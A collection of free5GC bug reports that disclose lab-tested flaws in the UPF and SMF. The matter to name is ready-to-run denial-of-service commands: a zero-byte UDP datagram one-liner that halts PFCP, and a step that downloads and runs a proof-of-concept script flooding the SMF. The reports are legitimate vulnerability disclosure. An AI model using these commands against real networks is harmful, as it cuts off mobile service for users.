items.title: [Bugs] UPF stops serving PFCP entirely on a single zero-byte UDP datagram to 8805 (read loop exits with "pfcp server stopped"; clean ExitCode=0 leaves no crash signature)
items.body:
## Bug Decription

A single **zero-length** UDP datagram sent to the UPF's PFCP port (8805/udp), with no
authentication, makes the UPF's PFCP server stop listening. The UPF stops answering PFCP
Heartbeat Requests and all N4 traffic; reproduced **3/3**. The same datagram has no effect on
free5GC's own SMF, on OpenAirInterface's UPF/SMF, or on Open5GS's UPF/SMF, so this is specific to
the UPF's PFCP server loop.

Observed sequence per repetition (timestamps from `docker logs`, 2026-09-05):

```
...T06:05:21.260412950Z [INFO][UPF][PFCP][LAddr:upf.free5gc.org:8805] handleHeartbeatRequest   <- last heartbeat answered
...T06:05:22.884449138Z [INFO][UPF][PFCP][LAddr:upf.free5gc.org:8805] pfcp server stopped      <- zero-byte datagram received here
(no further response to heartbeats; container restarted ~15 s later, RestartCount 2 -> 3)
```

The same three repetitions produced `RestartCount` 2→3, 3→4, 4→5, i.e. the container does restart —
but only **after** an outage window (≈70 s in a separate calibration run, <30 s in this sweep), and
the process then exits with **`ExitCode=0`, `OOMKilled=false`**. The combination makes the event
invisible to ordinary monitoring:

- during the outage window `docker inspect` reports `State.Status = running`, port 8805 is still
  bound, and `RestartCount` has not incremented yet;
- the container has `Health = none`, so no healthcheck observes the outage;
- after the window the exit is clean (code 0, no panic, no signal), so nothing looks like a crash;
  the only traces are the `pfcp server stopped` log line and the incremented `RestartCount`.

Contrast — how the same zero-byte datagram is handled elsewhere:

| Target | Behaviour |
|---|---|
| free5GC **SMF** | `[WARN][SMF][PFCP] Read PFCP error: pfcp: unmarshal msg failed` — datagram dropped, service continues |
| OAI UPF / SMF | `[udp] [error] Recvfrom failed Success` — error logged, heartbeats still answered |
| Open5GS UPF / SMF | no effect |
| free5GC **UPF** | **PFCP server stops; service lost until the container restarts** |

Impact: every PFCP association to that UPF is lost; PDU session establishment, modification and
deletion all fail, and sessions established before the event lose their forwarding state when the
UPF comes back. The interruption is self-healing only because of the Docker `restart` policy.

## To Reproduce

1. Deploy free5GC v4.2.3 with the official docker-compose (no config changes; default
   `upfcfg.yaml`, PFCP listening on the UPF's N4 address).
2. From any host/container that can route to the UPF's 8805/udp (in our lab: the `pentest-client`
   container on the compose network), send one empty datagram:

   ```bash
   printf '' | socat - UDP-DATAGRAM:<UPF_N4_IP>:8805
   # or:
   python3 -c "import socket;socket.socket(socket.AF_INET,socket.SOCK_DGRAM).sendto(b'',('<UPF_N4_IP>',8805))"
   ```

3. Send a PFCP Heartbeat Request before and after (`20 01 00 0c 00 d9 00 00 00 60 00 04 01 02 03 04`):
   before the shot the UPF answers with a 16-byte Heartbeat Response; after the shot there is no
   response at all, and the container log shows `pfcp server stopped`.
4. No packet capture needed: the trigger is a zero-byte datagram.

## Expected Behavior

A zero-length datagram should be treated as an empty (malformed) packet: log it at WARN/ERROR and
continue the read loop, exactly as the SMF does. The PFCP server must not exit its listen loop on a
transport-layer condition, and the UPF should keep serving N4.

## Screenshots

Not applicable (headless containers).

## Environment

- free5GC Version: v4.2.3 (official prebuilt image `free5gc/upf:v4.2.3`)
- OS: Ubuntu 22.04.5 LTS (host), Docker deployment
- Kernel version: 6.8.0-138-generic
- go version: 1.26.2 (official builder image `golang:1.26.2-trixie`; runtime images ship no toolchain)
- C compiler version (optional): n/a for this path

## Trace Files

### Configuration Files

Unmodified defaults; relevant excerpt of `config/upfcfg.yaml`:

```yaml
pfcp:
  addr: 127.0.0.8      # N4 listen address (container-internal in our lab)
  nodeID: 127.0.0.8
```

### PCAP File

Not attached: the trigger is a zero-byte datagram (no payload to capture).

### Log File

Excerpt in "Bug Decription" above; three repetitions on 2026-09-05, each gated by a readiness check
(container running, port bound, process age) and each confirmed by a before/after liveness probe.
`RestartCount` deltas 2→3, 3→4, 4→5; exit code 0, `OOMKilled=false`.

## System Architecture (Optional)

Local container lab only (three 5G cores side by side, 58 containers, 5 Docker networks, UERANSIM
UE/gNB). No traffic was sent to any system outside the lab. The N4 port is not published outside
the host; the demonstrated attacker model is "any host that can route to 8805/udp", which in a
typical deployment includes every NF on the core network and any compromised SMF.

## Walkthrough (Optional)

Found while calibrating liveness oracles for an unrelated test: the UPF kept going silent although
every readiness check passed. Attribution was established by re-sending each candidate datagram
**alone** (zero-byte, one-byte `0x20`, 8-byte truncated header) with liveness probes before and
after; only the zero-byte datagram reproduces the effect. Two suggestions:

1. Treat a zero-length read as an empty datagram and `continue` the read loop instead of exiting it.
2. Add a healthcheck (or an internal watchdog) that fails while the PFCP server loop is not
   running — at present the container looks perfectly healthy throughout the outage, and the
   eventual restart reports exit code 0, so neither crash monitors nor liveness probes see anything.

items.title: [Bugs] Quadratic PFCP Grouped-IE Parse on the Single N4 Receiver Goroutine (SMF)
items.body:
### Bug Description

free5GC's **SMF** decodes its entire N4 (PFCP, UDP/8805) interface on **one goroutine**, **inline**, before reading the next datagram. Its decoder decides that an IE is **grouped** — that it holds further IEs — purely from the **type value on the wire**, and sets **no nesting-depth limit**, so one datagram makes the SMF walk an attacker-chosen tree whose parsing cost grows with the **square** of that depth, and nothing is read from N4 while the walk runs.

No malformed input is needed: a PFCP body is a sequence of TLV IEs and a grouped IE's value is again a sequence of IEs, so an IE holding itself is a legal-looking encoding. An ordinary **Heartbeat Request** — no association, no credentials, no prior connection — carrying one **Create PDR** nested 16 000 levels (64 013 octets, one under the SMF's 65 536 limit) passes its only inbound check, length self-consistency. Parsing is quadratic because the cursor advances past each IE by **recomputing** its encoded length, which re-walks the subtree: **128 008 000** node visits.

One datagram blocks the receiver for **6.4–7.5 s**; at one every ~3 s it never frees up, so new PDU Sessions are refused with `NETWORK_FAILURE` while registration and existing sessions are unaffected.

### To Reproduce

Tested target: free5GC **v4.3.0** — SMF `free5gc/smf:v4.3.0`, upstream submodule `github.com/free5gc/smf@1c9d766` (tag `v1.4.6`, branch `main`); Docker Compose project `free5gc-v430`, SMF N4 at `10.100.200.5:8805/udp`, UPF Node ID `10.100.200.3`. The attack runs from the Docker host and needs the Python 3 standard library only.

1. **Deploy the target core** (tngf exits 0 by design):

   ```bash
   git clone https://github.com/hackeryounow/5gc-deployments.git
   cd 5gc-deployments/free5gc/4.3.0
   docker compose -p free5gc-v430 up -d
   sleep 45                      # let the NFs register at the NRF
   ```

2. **Provision subscribers** (a fresh `dbdata` volume is empty — registration fails without this) **and start the UE**:

   ```bash
   pip3 install git+https://github.com/hackeryounow/coresimrunner.git@v1.4.0
   coresimrunner --mode provision --count 5 --core-network free5gc \
           --core-address 127.0.0.1 --webui-port 5000 \
           --initial-imsi-index 1 --plmn 20893 \
           --opc 8e27b6af0e692e750f32667a3b14605d \
           --ki 8baf473f2f8fd09487cccbd7097c6862 \
           --username admin --password free5gc --no-ims
   docker exec -d ueransim bash -c 'cd /ueransim && ./nr-ue -c ./config/uecfg.yaml > /tmp/ue.log 2>&1'
   sleep 40 && docker exec ueransim sh -c 'ip -br addr | grep uesimtun'
   # -> uesimtun0 10.60.0.1/16   uesimtun1 10.61.0.1/16
   ```

3. **Fetch the exploit and run it** — one 64 013-octet Heartbeat Request every 3 s for 100 s:

   ```bash
   wget https://raw.githubusercontent.com/hackeryounow/5GCVulDB/refs/heads/main/VUL-20260930-POC/b1_1_grouped_ie_quadratic_poc.py
   python3 b1_1_grouped_ie_quadratic_poc.py --target 10.100.200.5 --port 8805 \
           --depth 16000 --count 0 --interval 3 --duration 100
   ```

### Expected Behavior

The parser must bound input structure before it parses: a nesting depth of 16 000 (or any depth beyond what TS 29.244 legally defines, a handful of levels) must be rejected by a cheap pre-check on the wire bytes, and the quadratic `MarshalLen()` re-walk must never run on the single goroutine that services the N4 socket. Because the deafness is the product of *serialized* work, a depth cap alone is not enough: the receive path should also stay drained (read into a bounded queue, parse in workers, discard over-cap traffic), otherwise any per-packet cost, linear or not, becomes a sustained outage at a sender-chosen rate.

- Deployment: Docker-based 5G Core Network (compose project `free5gc-v430`, bridge `free5gc-v430_privnet`)
- OS: Ubuntu 20.04.6 LTS

- go version: 1.27.1 linux/amd64

None

**Vulnerability Type.** Uncontrolled Resource Consumption (CWE-400): one unauthenticated datagram makes the SMF burn a whole core on an unbounded, attacker-chosen input quantity — the grouped-IE nesting depth (CWE-1284).

**Impact.** One 64 KB datagram every 3–5 s (108–171 kbit/s) holds the SMF's N4 read path **100 % busy**

**CVSS v4.** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N` — **6.9 (Medium)**

items.title: [Bugs] SMContext, UE IP and TEIDs leaked when PDU session establishment reject fails after the 201 response
items.body:
## Bug Description
`HandlePDUSessionSMContextCreate` returns `201 Created` with a `Location` header as soon as it has handed PFCP session setup to a goroutine. If that setup then fails, `EstHandler` calls `sendPDUSessionEstablishmentReject` to tear the context down, but that function has three early returns before the one call that actually releases it, at the very end.

Taking any of the three leaves the SMContext registered in all three package-level maps, with its UE IP address and four TEIDs still allocated. Because the `201` already went out, the AMF believes the session was created and has no reason to send a release.

Reproduced below with no change to the leaking code: an association-only PFCP responder plus an absent AMF is enough. 31 requests leave 31 SMContexts, 31 `canonicalRef` entries, 31 `seidSMContextMap` entries and 31 UE IP addresses held, with zero `Release IP` log lines.

`sendPDUSessionEstablishmentAccept` has the same shape with four early returns and no release call at all.

**Acquire.** `NewSMContext` registers into `smContextPool` and `canonicalRef`, and into `seidSMContextMap` once PFCP context exists:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/sm_context.go#L282-L284

```go
smContext.Ref = uuid.New().URN()
smContextPool.Store(smContext.Ref, smContext)
canonicalRef.Store(canonicalName(id, pduSessID), smContext.Ref)
```

**Release.** `RemoveSMContext` clears all three maps and returns the UE IP and four TEIDs:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/sm_context.go#L397-L426

```go
ReleaseUEIP(smContext.SelectedUPF, smContext.PDUAddress, smContext.UseStaticIP)
for _, pfcpSessionContext := range smContext.PFCPContext {
    seidSMContextMap.Delete(pfcpSessionContext.LocalSEID)
}
ReleaseTEID(smContext.LocalULTeid)
ReleaseTEID(smContext.LocalDLTeid)
ReleaseTEID(smContext.LocalULTeidForSplitPDUSession)
ReleaseTEID(smContext.LocalDLTeidForSplitPDUSession)
smContextPool.Delete(ref)
canonicalRef.Delete(canonicalName(smContext.Supi, smContext.PDUSessionID))
```

Its only caller is `RemoveSMContextFromAllNF`, so missing that call means the context is never released.

**The response goes out before anything can fail.** PFCP setup is handed to a goroutine and the handler answers immediately:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L291-L306

```go
needUnlock = false
go func() {
    defer smContext.SMLock.Unlock()
    smContext.SendUpPathChgNotification("EARLY", SendUpPathChgEventExposureNotification)
    handler := func(smContext *smf_context.SMContext, success bool) {
        p.EstHandler(isDone, smContext, success)
    }
    ActivateUPFSession(smContext, handler)
    ...
}()
```

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L330-L331

```go
c.Header("Location", location)
c.JSON(http.StatusCreated, response)
```

By the time the goroutine can fail, the AMF already holds a `201` and a `smContextRef`.

**Where the release is skipped.** A failed PFCP establishment gives `success = false`, and `EstHandler` routes to the reject path:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/datapath.go#L250-L263

```go
if success {
    p.sendPDUSessionEstablishmentAccept(smContext)
} else {
    p.sendPDUSessionEstablishmentReject(smContext, nasMessage.Cause5GSMNetworkFailure)
}
```

That function exists to tear the context down, yet the teardown is its last statement and three returns precede it:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/datapath.go#L269-L308

```go
smNasBuf, err := smf_context.BuildGSMPDUSessionEstablishmentReject(
    smContext, nasMessage.Cause5GSMNetworkFailure)
if err != nil {
    logger.PduSessLog.Errorf("Build GSM PDUSessionEstablishmentReject failed: %s", err)
    return                                        // L276: no release
}
...
ctx, _, errToken := smf_context.GetSelf().GetTokenCtx(
    models.ServiceName_NAMF_COMM, models.NrfNfManagementNfType_AMF)
if errToken != nil {
    logger.PduSessLog.Warnf("Get NAMF_COMM context failed: %s", errToken)
    return                                        // L295: no release
}
rspData, err := p.Consumer().
    N1N2MessageTransfer(ctx, smContext.Supi, n1n2Request, smContext.CommunicationClientApiPrefix)
if err != nil || rspData == nil {
    logger.ConsumerLog.Warnf("N1N2MessageTransfer for SendPDUSessionEstablishmentReject failed: %+v", err)
    return                                        // L301: no release
}
...
p.RemoveSMContextFromAllNF(smContext, true)       // L307: the only release
```

This path runs after UPF selection and IP allocation, so the UE IP and TEIDs are already assigned and leak along with the map entries.

**The accept path has the same shape.** `sendPDUSessionEstablishmentAccept` has four early returns and no release call anywhere:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/datapath.go#L308-L369

Not releasing on success is correct, but a token or `N1N2MessageTransfer` failure means nothing reached the AMF while the context stays registered. Same defect, should be fixed in the same change.

## To Reproduce
free5gc v4.2.2, SMF v1.4.3. NRF/UDR/UDM/PCF/SMF on loopback, subscriber `imsi-208930000000001`, DNN `internet`, `oauth: true`. Only source change is an `AuthorizationCheck` bypass so `curl` can stand in for an AMF; `datapath.go`, `NewSMContext` and `RemoveSMContext` are untouched.

Two ordinary failures are needed. The UPF must be associated but unresponsive to session messages: a ~90-line UDP stub answers Association Setup and Heartbeat, ignores Session Establishment. (With no UPF at all, selection skips it and the create fails earlier on a path that releases correctly.) The AMF is simply not started, so `GetTokenCtx(NAMF_COMM, AMF)` fails.

A probe in the SMF runs `runtime.GC()` and reports the three map sizes, so anything still counted is reachable state.

**The leak, one request:**

    http=201                                        <- AMF is told the session exists
    Location: .../sm-contexts/cd02218a-0ba0-4e97-9ff4-b4e7a602cc6c
    probe now    : smContextPool 1, canonicalRef 1, seidSMContextMap 1
    probe at 15s : smContextPool 1, canonicalRef 1, seidSMContextMap 1

What happened in between:

    [INFO] Allocated UE IP address: 10.60.0.1
    [INFO] Sending PFCP Session Establishment Request
    [INFO] | 201 | POST /nsmf-pdusession/v1/sm-contexts     <- response already sent
       ... 9 s later, in the goroutine ...
    [WARN] Sending PFCP Session Establishment Request error: retry-out
    [WARN] Get NAMF_COMM context failed: server no response  <- L294, returns at L295

L307 is never reached. No `is deleted from pool`, no `Release IP`. The context, its IP and its TEIDs stay held while the AMF believes the session is up.

**Control, same setup:** remove the subscriber policy from the PCF and the create fails at `ApplySessionRules`, before the goroutine:

    [INFO] UE[imsi-...] PDUSessionID[1] Release IP[10.60.0.2]
    [INFO] smContext[urn:uuid:5ea46820-...] is deleted from pool

Same request, same code, released properly. Only the post-`201` async path leaks.

**Accumulation, 31 requests** — `pduSessionId` incrementing:

| requests | smContextPool | canonicalRef | seidSMContextMap | heap objects |
|---|---|---|---|---|
| 10 | 10 | 10 | 10 | 26,553 |
| 20 | 20 | 20 | 20 | 29,465 |
| 30 | 30 | 30 | 30 | 32,387 |
| 31, after forced GC | 31 | 31 | 31 | 32,730 |

Slope exactly 1 per request across all three maps, no ceiling, unchanged by `runtime.GC()`.

    'retry-out'                     31   every PFCP establishment failed
    'Get NAMF_COMM context failed'  31   every one reached L294
    'Allocated UE IP address'       31
    'Release IP'                     0   31 addresses out, none back

## Expected Behavior
When the reject path takes any early return (L276, L295, L301), and likewise when the accept path fails on a token or `N1N2MessageTransfer` error, the handler should still release the SMContext via `RemoveSMContextFromAllNF` before returning, so the context, its UE IP and its TEIDs are not leaked.

## Screenshots
N/A

## Environment
 - free5GC Version: v4.2.2 (SMF v1.4.3, `2232d299`)
 - OS: Ubuntu 24.04.5 LTS
 - Kernel version: 6.8.0-139-generic
 - go version: go1.27.0 linux/amd64
 - C compiler version (optional):

## Trace Files
### Configuration Files
N/A — default config with only `oauth: true` set. Reproduction conditions are described above.

### PCAP File
N/A — this is a code-logic issue, unrelated to the packet level.

### Log File

    [INFO] Allocated UE IP address: 10.60.0.1
    [INFO] Sending PFCP Session Establishment Request
    [INFO] | 201 | POST /nsmf-pdusession/v1/sm-contexts
    [WARN] Sending PFCP Session Establishment Request error: retry-out
    [WARN] Get NAMF_COMM context failed: server no response

## System Architecture (Optional)
Bare metal, single host. NRF/UDR/UDM/PCF/SMF on loopback, UPF replaced by an association-only UDP stub.

## Walkthrough (Optional)
The reject path runs after UPF selection and IP allocation, so the UE IP and TEIDs are already assigned and leak along with the map entries. The IP pool binds long before memory does: a `/24` DNN pool holds 254 addresses, so a few hundred leaked contexts exhaust it and new sessions are refused for the whole DNN while `free -m` still looks fine.

## Additional Context
Each create that reaches the reject path and takes L276, L295 or L301 permanently holds one entry in each of the three maps, the SMContext itself (thirteen maps, four ID generators, a BPManager, two UPTunnels, roughly 80 heap objects in the measured run), one UE IP address and four TEIDs.

The AMF does hold `smContextRef` from the `201`, so a release is not structurally impossible the way it is when the identifier is never sent. But the AMF was told the session succeeded and has no reason to release it, and in this scenario the AMF is itself unreachable. In practice these contexts persist until the SMF restarts or a create with the same SUPI and PDU session id reclaims them.

State also diverges three ways: the AMF and UE believe a session exists, the UPF has no session installed, and the SMF holds a context it failed to tear down.

items.title: [Bugs]Duplicate SM context is never released when PFCP session deletion fails; each UE retry orphans one SMContext and one UE IP
items.body:
## Bug Description
On a duplicate PDU session create, `HandlePDUSessionSMContextCreate` calls `HandlePDUSessionSMContextLocalRelease` on the old context. That function releases it only in the `SessionReleaseSuccess` branch; `SessionReleaseFailed` and default set the state back to `Active` and return without releasing. It has no return value, so the caller creates a new context regardless, and `NewSMContext` overwrites `canonicalRef[supi-pduSessionId]` with the new UUID.

The old context stays in `smContextPool` and `seidSMContextMap`, holding a UE IP and four TEIDs, and is no longer reachable by SUPI and PSI. The AMF only ever learned the new UUID.

Trigger: PFCP session deletion fails while the UPF stays associated, and the UE retries the same PDU session. One orphan per retry.

The sibling function `HandlePDUSessionSMContextRelease` gets this right: its release sits after the switch and runs on every branch.

**Acquire.** `NewSMContext` registers into `smContextPool` and `canonicalRef` (and `seidSMContextMap` once PFCP context exists):

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/sm_context.go#L282-L284

```go
smContext.Ref = uuid.New().URN()
smContextPool.Store(smContext.Ref, smContext)
canonicalRef.Store(canonicalName(id, pduSessID), smContext.Ref)
```

**Release.** `RemoveSMContext` clears all three maps plus the UE IP and four TEIDs. Its only caller is `RemoveSMContextFromAllNF`:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/sm_context.go#L397-L426

```go
ReleaseUEIP(smContext.SelectedUPF, smContext.PDUAddress, smContext.UseStaticIP)
for _, pfcpSessionContext := range smContext.PFCPContext {
    seidSMContextMap.Delete(pfcpSessionContext.LocalSEID)
}
ReleaseTEID(smContext.LocalULTeid)
ReleaseTEID(smContext.LocalDLTeid)
ReleaseTEID(smContext.LocalULTeidForSplitPDUSession)
ReleaseTEID(smContext.LocalDLTeidForSplitPDUSession)
smContextPool.Delete(ref)
canonicalRef.Delete(canonicalName(smContext.Supi, smContext.PDUSessionID))
```

**Where it is skipped.** Only `SessionReleaseSuccess` reaches the release:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L1352-L1385

```go
pfcpResponseStatus := releaseSession(smContext)

switch pfcpResponseStatus {
case smf_context.SessionReleaseSuccess:
    ...
    p.RemoveSMContextFromAllNF(smContext, false)   // L1374: the only release

case smf_context.SessionReleaseFailed:
    smContext.SetState(smf_context.Active)         // L1378: no release

default:
    smContext.SetState(smf_context.Active)         // L1383: no release
}
```

A PFCP Session Deletion that times out yields `SessionReleaseFailed`, so that is the branch taken.

**Why nothing recovers it.** `LocalRelease` has no return value, so the caller creates a new context regardless and overwrites the lookup key:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L73-L78

```go
if dup_smCtx := smf_context.GetSMContextById(createData.Supi, createData.PduSessionId); dup_smCtx != nil {
    p.HandlePDUSessionSMContextLocalRelease(dup_smCtx, createData)
}

smContext := smf_context.NewSMContext(createData.Supi, createData.PduSessionId)
```

**The sibling function does it right.** Same switch, same statuses, but the release sits after it:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L1310

```go
switch pfcpResponseStatus {
case smf_context.SessionReleaseSuccess:  ...
case smf_context.SessionReleaseFailed:   ...
default:                                 ...
}
p.RemoveSMContextFromAllNF(smContext, false)   // L1310: runs on all three
```

## To Reproduce
free5gc v4.2.2, SMF v1.4.3. NRF/UDR/UDM/PCF/SMF on loopback, oauth off. Only source change is an `AuthorizationCheck` bypass so `curl` can stand in for an AMF; the leaking code is untouched.

The UPF must be associated but unresponsive to deletion: a ~110-line UDP stub answers Association Setup, Heartbeat and Session Establishment (returning a UP F-SEID so the SMF installs the session), but ignores Session Deletion, so deletions time out to `SessionReleaseFailed`. No AMF is run, so an AM policy association is created once directly against the PCF, which is enough for the SM policy lookup to succeed; in a real network the AMF does this. (With no UPF at all, selection skips it and the create fails earlier on a path that releases correctly.)

A probe in the SMF runs `runtime.GC()` and reports the map sizes. Every request reuses `pduSessionId` 88, so `canonicalRef` cannot grow: `smContextPool - canonicalRef` is the orphan count.

**The leak, one retry:**

    attempt 1:  smContextPool 1, seidSMContextMap 1, canonicalRef 1   establishes normally (State→Active), 0 orphans
    attempt 2:  smContextPool 2, seidSMContextMap 2, canonicalRef 1   duplicate found, release failed, 1 orphan

What happened between them, at `level: trace`:

    [INFO] Sending PFCP Session Deletion Request
    [WARN] Sending PFCP Session Deletion Request error: request Transaction [647]: retry-out
    [TRAC] In case SessionReleaseFailed          <- L1377, so L1374 was skipped

`is deleted from pool` never appears. The context that attempt 1 established is still in the pool, and `canonicalRef` now points at attempt 2's UUID.

**Accumulation, 30 retries** — same SUPI, same PSI (`pduSessionId` 88), starting from a clean pool:

| n | smContextPool | seidSMContextMap | canonicalRef | orphans |
|---|---|---|---|---|
| 5 | 7 | 7 | 1 | 6 |
| 10 | 12 | 12 | 1 | 11 |
| 15 | 17 | 17 | 1 | 16 |
| 20 | 22 | 22 | 1 | 21 |
| 25 | 27 | 27 | 1 | 26 |
| 30 | 32 | 32 | 1 | 31 |

Slope exactly 1 per retry, no ceiling, unchanged by a forced `runtime.GC()`. `canonicalRef` pinned at 1 throughout, which is why the orphans are unreachable by SUPI and PSI.

    'In case SessionReleaseFailed'           30   deletion failed every retry
    'is deleted from pool'                    0   released nothing
    'Allocated UE IP address'                30   one new context per retry
    'Release IP'                              0   none returned

Attempt 1 is the control: no duplicate, so `LocalRelease` is never called and nothing leaks. Same endpoint, same payload, same code from attempt 2 on.

The default branch at L1380 has the same omission but was not reached in testing.

## Expected Behavior
`HandlePDUSessionSMContextLocalRelease` should release the old context on every branch of the switch — not only `SessionReleaseSuccess` — as the sibling `HandlePDUSessionSMContextRelease` does by placing `RemoveSMContextFromAllNF` after the switch (L1310). Otherwise a failed PFCP deletion leaves an orphaned context that the overwrite of `canonicalRef` makes permanently unreachable.

## Screenshots
N/A

## Environment
 - free5GC Version: v4.2.2 (SMF v1.4.3, `2232d299`)
 - OS: Ubuntu 24.04.5 LTS
 - Kernel version: 6.8.0-139-generic
 - go version: go1.27.0 linux/amd64
 - C compiler version (optional):

## Trace Files
### Configuration Files
N/A — default config, `oauth` off. Reproduction conditions are described above.

### PCAP File
N/A — this is a code-logic issue, unrelated to the packet level.

### Log File

    [INFO] Sending PFCP Session Deletion Request
    [WARN] Sending PFCP Session Deletion Request error: request Transaction [647]: retry-out
    [TRAC] In case SessionReleaseFailed

## System Architecture (Optional)
Bare metal, single host. NRF/UDR/UDM/PCF/SMF on loopback, UPF replaced by an association-only UDP stub that ignores Session Deletion.

## Walkthrough (Optional)
A PFCP Session Deletion that times out yields `SessionReleaseFailed`, which sets the state back to `Active` and returns without releasing (L1378). Because `LocalRelease` has no return value, the caller creates a new context regardless and `NewSMContext` overwrites `canonicalRef[supi-pduSessionId]` with the new UUID, so the old context is left in `smContextPool` and `seidSMContextMap`, holding its UE IP and four TEIDs, unreachable by SUPI and PSI.

## Additional Context
A UE that re-requests an existing `pduSessionId` takes this path, and each retry with the same `pduSessionId` repeats it. Each one leaves an SMContext, a `seidSMContextMap` entry, a UE IP and four TEIDs held with no normal path to release them.

This trigger is more common than the other leaks of this pair, which need an NRF or AMF outage. Here a UPF-side problem suffices, and the amplification comes from the UE's own retry behaviour.

UE IP exhaustion arrives well before memory pressure: a `/24` DNN pool holds 254 addresses, and the measured run consumed one per retry from a single UE. Once empty, UPF selection fails for every new session on that DNN.


## How did we find?
We found this bug by using our (work-in-progress) static analysis tool, manually verified it, and made a runnable PoC.

items.title: [Bugs] SMF: local release leaves a charging session open on the CHF when the PFCP session deletion fails
items.body:
## Bug Description

To set up a PDU session, the SMF opens a charging session on the CHF: `CreateChargingSession` sends `CHARGING_INIT` and remembers the returned charging reference (`smContext.ChargingDataRef`). When such a session is torn down locally — `HandlePDUSessionSMContextLocalRelease`, e.g. a duplicate PDU session request for the same key — the SMF should close that charging session with `CHARGING_RELEASE`. On the failed-PFCP branch it does not, and it also does not remove the SMContext, so the session is left half-released with its charging session open on the CHF.

The local-release handler releases the PFCP session (`releaseSession`) and switches on the result. `ReleaseChargingSession` (`CHARGING_RELEASE`) is called only on `SessionReleaseSuccess`. On `SessionReleaseFailed` the handler only sets the state back to `Active` and returns — no charging release, and no `RemoveSMContextFromAllNF`.

Source analysis on SMF v1.4.3, commit `2232d299`. **Still present on upstream `main` (`1c9d766`, 2026-09-30):** in `HandlePDUSessionSMContextLocalRelease` the `SessionReleaseSuccess` branch still calls `ReleaseChargingSession` (pdu_session.go:1415) while the `SessionReleaseFailed` branch (pdu_session.go:1435) still only reverts the state — no charging release and no `RemoveSMContextFromAllNF`. (The `HandlePDUSessionSMContextRelease` handler has the same charging gap on its `SessionReleaseFailed` branch, at 1311/1317; `RemoveSMContextFromAllNF` in sm_common.go:7 also still has no charging release. Note: `HandlePDUSessionSMContextUpdate`'s failed branch is *not* a leak — it reverts the context to `Active` and leaves it reachable by `smContextRef`, so a later release can still close it.)

### The charging session is opened at create and its reference stored.

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L249-L252

`CreateChargingSession` sends `CHARGING_INIT` and stores the reference the CHF returns in `smContext.ChargingDataRef`.

### Local release switches on the PFCP result; only success releases charging.

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L1340-L1386

```go
pfcpResponseStatus := releaseSession(smContext)
switch pfcpResponseStatus {
case smf_context.SessionReleaseSuccess:
    p.ReleaseChargingSession(smContext)        // :1355-1356  CHARGING_RELEASE to the CHF
    smContext.SetState(smf_context.InActivePending)
    ...
    p.RemoveSMContextFromAllNF(smContext, false)

case smf_context.SessionReleaseFailed:         // :1376-1378  PFCP delete failed / UPF unreachable
    smContext.SetState(smf_context.Active)      // only reverts state
    // <-- no ReleaseChargingSession, no RemoveSMContextFromAllNF
}
```

### The charging release exists only on the success paths.

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/charging_trigger.go#L64-L68

`ReleaseChargingSession` sends `CHARGING_RELEASE`. It is reached only from the `SessionReleaseSuccess` branches. The failed-PFCP branch never calls it.

### What makes the PFCP delete fail.

`releaseSession` returns `SessionReleaseFailed` when the UPF does not acknowledge the PFCP session deletion (unreachable UPF, or a rejected/timed-out N4 Session Deletion). The charging session has already been opened at that point, so any such failure leaves it open on the CHF.

## To Reproduce

On SMF v1.4.3, driven through the project's own SMF unit-test harness (`internal/sbi/processor/pdu_session_test.go`): gock-stubbed NRF/UDM/PCF/CHF and a stub PFCP, no real UPF.

**How charging is opened.** The NRF stub lets the SMF discover a CHF, so `CHFSelection` succeeds and `CreateChargingSession` sends `CHARGING_INIT`; the CHF stub answers `201` with a charging reference.

**How the PFCP release is made to fail.** The failed-PFCP outcome is reproduced at its exact point with a one-line, env-gated fault in `releaseSession` (`POC_FORCE_RELEASE_FAILED=1` → returns `SessionReleaseFailed`), which is the value a real UPF-unreachable / rejected N4 deletion yields. The leaking code under test (the `SessionReleaseFailed` branch that omits `ReleaseChargingSession`) is unchanged and off by default.

**What is counted.** The CHF stub counts `CHARGING_INIT` (`POST .../chargingdata`) and `CHARGING_RELEASE` (`POST .../chargingdata/{ref}/release`) with `gock.Observe`; SMContext liveness is read with `GetSMContextById(supi, pid)`. The PoC invokes `HandlePDUSessionSMContextLocalRelease` directly on existing contexts, so liveness can still be read with `GetSMContextById`; in the real create path the key is overwritten right after (`NewSMContext`), as described under **The leak** below, which is what makes the stranded context unreachable in production.

```
                 CHARGING_INIT sent | CHARGING_RELEASE sent | live SMContexts | live ChargingDataRef
  control (PFCP OK)              1  |                    1  |              0  |                   0
  LEAK n= 1                      1  |                    0  |              1  |                   1
  LEAK n=10                     10  |                    0  |             10  |                  10
  LEAK n=30                     30  |                    0  |             30  |                  30
```

**The leak.**
- Each of the 30 local releases opened a charging session and then hit `SessionReleaseFailed`.
- Not one `CHARGING_RELEASE` reached the CHF.
